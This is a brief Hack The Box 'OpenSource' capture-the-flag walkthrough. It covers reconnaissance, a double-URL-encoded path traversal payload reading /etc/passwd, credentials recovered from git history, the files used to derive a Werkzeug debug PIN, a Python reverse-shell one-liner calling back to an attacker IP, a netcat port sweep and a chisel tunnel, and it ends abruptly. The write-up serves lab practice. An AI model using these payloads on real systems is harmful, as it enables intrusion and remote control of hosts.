Hack The Box : OpenSource

Nmap scan

```bash
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
```
usual ports are open

Check the web application running on port 80 
their is a option for downloading source code of the application

after downloading and analyzing the source code we found vuln in uploads endpoint
which is an LFI but their is an validation for path travesel we need to get bypass the validation
using double url encoding and also we found a creds from git 
```bash
git branch -a
git log dev --oneline
git show a76f8f7
```
```
 "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/"
```

```python
@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

set payload for reading /etc/passwd

```
%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F/etc/passwd
```

their is also a anothor vuln. it is an file upload through lfi it can be lead to overwrite the source code
for getting a shell 'RCE'
```
..//..//app/app/view.py
```
but we take the shell through python debug console
we know from the begining the nmap showing the http is a python server and  Werkzeug/2.1.2 is a gateway
In the webapplication the werkzeug enable the debug console by default

Generate the debug console pin using LFI
               
```bash              
/proc/net/arp

/sys/class/net/eth0/address

/proc/sys/kernel/random/boot_id

/proc/self/cgroup
````

payload for shell

```python
python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.48",9005));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")"
```
we get the shell inside the docker container

enumerating ip
```
for ip in $(seq 1 255); do nc -v -n -z -w 1 172.17.0.$ip 3000; done
```
172.17.0.1:3000 is open on docker port

forwarding the port 3000 into our local  machine using chisel

```
chisel client 10.10.16.48:9005 R:5000:socks
```

dev01@opensource.htb